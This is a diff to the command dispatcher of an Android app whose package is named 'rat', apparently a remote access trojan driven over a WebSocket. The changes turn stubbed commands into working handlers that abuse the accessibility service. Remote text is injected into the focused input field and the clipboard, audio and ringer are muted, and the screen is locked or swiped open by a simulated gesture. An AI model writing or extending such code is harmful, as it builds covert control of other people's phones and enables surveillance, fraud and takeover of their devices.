@@ -2,12 +2,18 @@ package com.vendor.rat.control.handler;
 
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.GestureDescription;
+import android.content.ClipData;
+import android.content.ClipboardManager;
+import android.content.Context;
 import android.graphics.Path;
+import android.media.AudioManager;
+import android.os.Bundle;
 import android.util.Log;
 
 import com.google.gson.JsonObject;
 import com.google.gson.JsonParser;
 
+import com.vendor.rat.MainApplication;
 import com.vendor.rat.network.NetworkManager;
 import com.vendor.rat.network.WebSocketClient;
 import com.vendor.rat.service.CommandHandler;
@@ -152,28 +158,24 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
                 handleSnap(payload);
                 break;
             case "paste":
-                Log.d(TAG, "paste: " + payload.toString());
-                // TODO: 粘贴文本到当前焦点
+                handlePaste(payload);
                 break;
             case "block":
                 Log.d(TAG, "block: " + payload.toString());
-                // TODO: 黑屏遮罩
+                // TODO: 黑屏遮罩 (需要 WindowManager overlay)
                 break;
             case "vol":
-                Log.d(TAG, "volume: " + payload.toString());
-                // TODO: 音量控制
+                handleVolume(payload);
                 break;
             case "kb":
                 Log.d(TAG, "keyboard: " + payload.toString());
-                // TODO: 键盘控制
+                // TODO: 键盘显示/隐藏控制
                 break;
             case "L":
-                Log.d(TAG, "lock: " + payload.toString());
-                // TODO: 锁屏控制
+                handleLock(payload);
                 break;
             case "Q":
-                Log.d(TAG, "quality: " + payload.toString());
-                // TODO: 投屏画质调整
+                handleQuality(payload);
                 break;
             case "out":
                 screenshotHandler.handle(payload);
@@ -346,5 +348,102 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
         JsonObject cmd = new JsonObject();
         cmd.addProperty("comdtype", "SM");
         screenshotHandler.handle(cmd);
+    }
+
+    /**
+     * 粘贴文本到当前焦点
+     * 格式: {"type":"screen", "subc":"paste", "txt":"hello"}
+     */
+    private void handlePaste(JsonObject payload) {
+        String txt = payload.has("txt") ? payload.get("txt").getAsString() : "";
+        Log.d(TAG, "paste: length=" + txt.length());
+
+        MyAccessibilityService service = MyAccessibilityService.P();
+        if (service == null || txt.isEmpty()) return;
+
+        // 设置剪贴板
+        ClipboardManager clipboard = (ClipboardManager) service.getSystemService(Context.CLIPBOARD_SERVICE);
+        if (clipboard != null) {
+            clipboard.setPrimaryClip(ClipData.newPlainText("paste", txt));
+        }
+
+        // 通过无障碍服务粘贴到当前焦点节点
+        android.view.accessibility.AccessibilityNodeInfo focus = service.findFocus(
+            android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT);
+        if (focus != null) {
+            Bundle args = new Bundle();
+            args.putCharSequence(android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, txt);
+            focus.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args);
+            focus.recycle();
+            Log.d(TAG, "paste: text set via ACTION_SET_TEXT");
+        } else {
+            Log.w(TAG, "paste: no input focus found, text copied to clipboard");
+        }
+    }
+
+    /**
+     * 音量控制
+     * 格式: {"type":"screen", "subc":"vol", "volstate":"0"=静音/"1"=取消静音}
+     */
+    private void handleVolume(JsonObject payload) {
+        String volstate = payload.has("volstate") ? payload.get("volstate").getAsString() : "0";
+        Log.d(TAG, "volume: volstate=" + volstate);
+
+        try {
+            MainApplication app = MainApplication.getInstance();
+            if (app == null || app.getApplication() == null) return;
+
+            AudioManager am = (AudioManager) app.getApplication().getSystemService(Context.AUDIO_SERVICE);
+            if (am == null) return;
+
+            if ("0".equals(volstate)) {
+                // 静音
+                am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_MUTE, 0);
+                am.adjustStreamVolume(AudioManager.STREAM_RING, AudioManager.ADJUST_MUTE, 0);
+            } else {
+                // 取消静音
+                am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_UNMUTE, 0);
+                am.adjustStreamVolume(AudioManager.STREAM_RING, AudioManager.ADJUST_UNMUTE, 0);
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "volume control failed", e);
+        }
+    }
+
+    /**
+     * 锁屏控制
+     * 格式: {"type":"screen", "subc":"L", "lock":"0"=解锁/"1"=锁屏}
+     */
+    private void handleLock(JsonObject payload) {
+        String lock = payload.has("lock") ? payload.get("lock").getAsString() : "0";
+        Log.d(TAG, "lock: " + lock);
+
+        MyAccessibilityService service = MyAccessibilityService.P();
+        if (service == null) return;
+
+        if ("1".equals(lock)) {
+            service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
+        } else {
+            // 解锁: 模拟上滑手势
+            int w = service.getResources().getDisplayMetrics().widthPixels;
+            int h = service.getResources().getDisplayMetrics().heightPixels;
+            Path path = new Path();
+            path.moveTo(w / 2f, h * 0.8f);
+            path.lineTo(w / 2f, h * 0.2f);
+            GestureDescription gesture = new GestureDescription.Builder()
+                .addStroke(new GestureDescription.StrokeDescription(path, 0, 300))
+                .build();
+            service.dispatchGesture(gesture, null, null);
+        }
+    }
+
+    /**
+     * 投屏画质调整
+     * 格式: {"type":"screen", "subc":"Q", "newq":"30"}
+     */
+    private void handleQuality(JsonObject payload) {
+        String newq = payload.has("newq") ? payload.get("newq").getAsString() : "";
+        Log.d(TAG, "quality: " + newq);
+        // TODO: 调整 ScreenshotHandler 的 JPEG_QUALITY 和 SCALE_FACTOR
     }
 }
